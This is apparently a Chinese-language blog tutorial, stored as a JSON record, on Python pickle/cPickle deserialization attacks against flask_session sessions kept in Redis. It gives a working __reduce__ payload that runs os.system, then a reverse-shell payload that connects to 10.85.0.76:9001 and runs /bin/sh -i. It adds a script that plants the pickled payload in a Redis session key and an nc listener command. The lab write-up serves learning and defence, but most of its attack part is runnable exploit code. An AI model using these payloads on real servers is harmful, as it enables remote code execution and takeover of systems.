{"title": "Python反序列化安全问题 - 个人文章 ", "index": "反序列化,flask,python", "content": "Python 反序列化安全问题（一）\n这一段时间使用flask做web开发，使用了redis存储session，阅读了flask_session源码，发现在存储session到redis过程中，利用了cPickle模块进行序列化以及反序列化；正好根据该样例学习一波Python反序列化相关的安全问题，不足之处请各位表哥指出。\n\n一、基础知识讲解\n1.1 cPickle模块\nPython中主要是用cPickle和pickle，前者是使用C语言实现，速度可达到后者的1000倍，使用范围较广（文档链接）\ncPickle可以序列化很多类型的对象，详情见文档。基础语法就是：\nimport cPickle\na = 1\nb = cPickle.dumps(a)\ncPickle.loads(b)\n文档中需要特别关注的是11.1.5.2，Pickling and unpickling extension types这一节主要内容就是讲述cPickle序列化以及反序列化扩展类的过程，原文有一句我并没有完全理解意思：\nWhen the Pickler encounters an object of a type it knows nothing about — such as an extension type\n初始理解的意思是：当遇到解释器一无所知的扩展类型的时候，但是对于理解的这句话，扩展类型是什么意思？后来想到Python中元类是type，这里extension types应该理解为type类型的class。\nclass A(): # 旧类\n     pass\ntype(A)\n<type 'classobj'>\nclass B(object): # 新类 \n     pass\ntype(B)\n<type 'type'>\n\n所以说这一节主要针对的应该是新类，即 class A(object) 此种写法创建的类（存疑，待补充完善）；当序列化以及反序列化的过程中中碰到未知类的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化，该方法可以返回string和tuple类型；问题主要出在tuple类型（后面会细述），通过构造__reduce__可达到命令执行的目的：\nimport cPickle\nimport os\nclass A(object):\n    def __reduce__(self):\n        a = 'whoami'\n        return (os.system,(a,))    \nb=A()\nresult = cPickle.dumps(b)\ncPickle.loads(result)\n\n使用上述命令即可执行whoami命令。同时也可以利用该方式反弹shell：\nimport cPickle\nimport os\nclass A(object):\n    def __reduce__(self):\n        a = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.76\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\"\n        return (os.system,(a,))    \nb=A()\nresult = cPickle.dumps(b)\ncPickle.loads(result)\n\n然后在10.85.0.76执行nc -lvvp 9001，即可成功获取shell。\n\n1.2 flask_session\n因为本次测试主要是依托于flask和redis，所以首先介绍一下flask_session。\nflask中默认使用客户端session，如果想要配置服务端session，就需要使用flask_session配合Redis（后面皆以Redis为主）或者其他数据库。flask_session使用Redis存储session的过程（主要使用如下的接口实现，只展示部分代码）：\nclass RedisSessionInterface(SessionInterface):\n    serializer = pickle  # 上文模块导入 import cPickle as pickle\n    session_class = RedisSession\n    \n    def open_session(self, app, request):  # 获取session\n        ……\n        val = self.redis.get(self.key_prefix + sid)\n        if val is not None:\n            try:\n                data = self.serializer.loads(val)  ## 将session值取出后反序列化\n                return self.session_class(data, sid=sid)\n            except:\n                return self.session_class(sid=sid, permanent=self.permanent)\n        return self.session_class(sid=sid, permanent=self.permanent)\n\n    def save_session(self, app, session, response):  # 存储session\n        ……\n        val = self.serializer.dumps(dict(session)) ## 将session值序列化存储到redis\n        \n上述过程简单说就是：session存取过程存在序列化和反序列化的过程。session在Redis中以键值对（key，value）的形式存储。假设我们能够操纵Redis中的键值对，将某个key的值设为我们序列化后恶意代码（比如上面反弹shell的代码样例），然后在将自身的cookie设置为该key，在访问网站的时候，服务端会对于根据key查找value并进行反序列化，进而反弹shell。下面对于该想法进行测试\n\n二、 漏洞测试\n测试环境：\n\nvictim：Ubuntu 14.04、Redis 2.8.4、IP：10.85.0.54\nattacker：Win10、IP：10.85.0.76\n\n2.1 构建服务端\n此处我用flask编写了一个服务端样例：\nimport redis\nimport os\nfrom flask import Flask,session\nfrom flask_session import Session\napp = Flask(__name__)\nSESSION_TYPE = 'redis'\nSESSION_PERMANENT = False\nSESSION_USE_SIGNER = False\nSESSION_KEY_PREFIX = 'session'\nSESSION_REDIS = redis.Redis(host='127.0.0.1',port='6379')\nSESSION_COOKIE_HTTPONLY = True\nPERMANENT_SESSION_LIFETIME = 604800  # 7 days\napp.config.from_object(__name__)\nSession(app)\n\n\n@app.route('/')\ndef hello_world():\n    session['name']='test'\n    return 'Hello World!'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0')\n\n将上述代码保存为app.py，第三方库安装完毕后，在服务器上运行\npython app.py\n\n即可在5000端口启动简单的服务端，访问如图所示，红框中是我们的sid，也是服务端查找session内容的key（因为设置了前缀，所以redis中key应该是session+sid）：\n2.2 更改session\n此时如果说我们将value设置为恶意代码会怎么样？\nimport cPickle\nimport os\nimport redis\nclass A(object):\n    def __reduce__(self):\n        a = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.76\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\"\n        return (os.system,(a,))    \nb=A()\nresult = cPickle.dumps(b)\nr = redis.Redis(host='127.0.0.1',port=6379)\nr.set('此处为'session'和你的sid拼接',result)\n\n运行上述代码后，我们可以发现我们的session内容变成下图所示内容：\n2.3 反弹shell\n此时在attacker监听9001端口：\nnc -lvvp 9001\n\n然后刷新浏览器中访问页面，发现成功反弹shell：\n\n三、emmmm\n目前很多Python的Web应用都用Redis等NoSQL进行session存储，当攻击者有机会去操纵服务端的session的时候（比如Redis未授权访问），配合反序列化漏洞即可执行命令。上述提到的两个库cPickle和pickle，两个库实现的功能基本相似，后面会对于Python实现的pickle库进行分析为何会出现命令执行的漏洞。\n\n                ", "mainLikeNum": ["2 "], "mainBookmarkNum": "1"}